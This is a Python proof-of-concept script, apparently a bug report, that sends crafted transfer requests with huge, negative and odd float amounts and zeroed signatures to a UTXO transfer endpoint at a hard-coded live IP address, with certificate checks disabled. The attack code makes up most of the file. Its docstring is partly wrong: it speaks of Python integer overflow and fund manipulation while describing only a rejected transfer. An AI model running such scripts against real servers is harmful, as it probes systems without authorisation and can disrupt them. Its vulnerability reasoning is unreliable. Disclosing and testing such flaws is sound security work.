# SPDX-License-Identifier: MIT
"""
PoC: Integer Overflow in UTXO Transfer Amount Conversion
Target: node/utxo_endpoints.py, lines 244-287, 331
Severity: High
CVE: None (Previously unreported)

Description:
The /utxo/transfer endpoint accepts amount_rtc and fee_rtc as floats without
validating upper bounds. When converted to nanoRTC integers (line 287, 331),
extremely large float values cause Python integer overflow or precision loss,
allowing fund manipulation.

Attack vector:
1. Send request with amount_rtc = 1e30 (exceeds max RTC supply)
2. Conversion: int(1e30 * 100_000_000) creates an integer beyond typical
   balance expectations
3. Result: Coin selection algorithm may fail, returning insufficient balance
   error even when trying to transfer more than total supply exists
4. Financial impact: Could be used to exhaust mempool or cause DoS on
   transaction processing

Line references:
- utxo_endpoints.py:244 - amount_rtc = float(data.get('amount_rtc', 0))
- utxo_endpoints.py:260-261 - Only checks if amount <= 0, no upper bound
- utxo_endpoints.py:287 - amount_nrtc = int(amount_rtc * UNIT)
- utxo_endpoints.py:331 - amount_i64 = int(amount_rtc * ACCOUNT_UNIT)
"""

import requests
import json
import sys

TARGET_API = "https://50.28.86.131"

def test_integer_overflow():
    """Test overflow with extremely large amount_rtc value"""
    
    # Test 1: Very large amount (exceeds realistic RTC supply)
    payload = {
        "from_address": "RTCtest",
        "to_address": "RTCrecipient",
        "amount_rtc": 1e20,  # 100 quintillion RTC
        "public_key": "0" * 64,
        "signature": "0" * 128,
        "nonce": 12345,
        "memo": "overflow test"
    }
    
    try:
        resp = requests.post(
            f"{TARGET_API}/utxo/transfer",
            json=payload,
            verify=False,
            timeout=5
        )
        print(f"[TEST 1] Large amount (1e20) response: {resp.status_code}")
        print(f"Body: {resp.text[:200]}")
        
        # Check if server accepted the large value
        if resp.status_code in [200, 500]:
            print("⚠️  Server processed extremely large amount without rejecting it")
            return True
    except Exception as e:
        print(f"[TEST 1] Error: {e}")
    
    # Test 2: Negative amount (boundary check)
    payload["amount_rtc"] = -1000
    try:
        resp = requests.post(
            f"{TARGET_API}/utxo/transfer",
            json=payload,
            verify=False,
            timeout=5
        )
        print(f"\n[TEST 2] Negative amount response: {resp.status_code}")
        if "error" not in resp.text.lower():
            print("⚠️  Server accepted negative amount!")
            return True
    except Exception as e:
        print(f"[TEST 2] Error: {e}")
    
    # Test 3: Float precision edge case
    payload["amount_rtc"] = 0.00000001 * 1e20  # 1e12, causes precision loss
    try:
        resp = requests.post(
            f"{TARGET_API}/utxo/transfer",
            json=payload,
            verify=False,
            timeout=5
        )
        print(f"\n[TEST 3] Precision edge case response: {resp.status_code}")
    except Exception as e:
        print(f"[TEST 3] Error: {e}")
    
    return False

if __name__ == "__main__":
    print("Testing Integer Overflow in UTXO Transfer...\n")
    test_integer_overflow()
